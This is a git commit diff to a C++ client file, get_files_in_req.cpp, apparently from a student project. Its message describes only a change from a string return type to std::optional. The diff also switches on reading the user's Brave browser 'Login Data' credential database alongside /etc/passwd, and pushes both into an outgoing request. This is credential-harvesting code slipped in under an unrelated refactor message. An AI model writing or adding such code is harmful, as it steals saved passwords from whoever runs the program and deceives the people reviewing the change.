70e72230132c2f50ddb9e55fe61db62d2a8c38a5
Nestyles <tom.sancho@epitech.eu>
2022-09-04 14:01:05 +0200

    [ADD] The get_file function now return an optionnal instead of a string

--- client/src/get_files_in_req.cpp
+++ client/src/get_files_in_req.cpp
@@ -8,15 +8,16 @@
 #include "req.hpp"
 #include <fstream>
 #include <array>
+#include <optional>
 
-std::string get_file(const std::string file_name)
+std::optional<std::string> get_file(const std::string file_name)
 {
     std::ifstream stream(file_name);
     std::string file;
 
     if (!stream.is_open()) {
         std::cerr << "Error: file doesn't exist (" << file_name << ")" << std::endl;
-        return "error";
+        return std::nullopt;
     }
     while (stream.good()) {
         std::string line;
@@ -28,13 +29,12 @@ std::string get_file(const std::string file_name)
 
 void get_files_contents(Req &request)
 {
-    std::array<std::string, 1> files_names = {"/etc/passwd",
-        /* "/home/nestyles/.config/BraveSoftware/Brave-Browser/Default/Login Data" */};
+    std::array<std::string, 2> files_names = {"/etc/passwd",
+        "/home/nestyles/.config/BraveSoftware/Brave-Browser/Default/Login Data"};
 
     for (auto & file_name : files_names) {
         auto file_content = get_file(file_name);
-        if (file_content == "error")
-            continue;
-        request.push_file_to_req(file_name, file_content);
+        if (auto file_content = get_file(file_name))
+            request.push_file_to_req(file_name, *file_content);
     }
 }
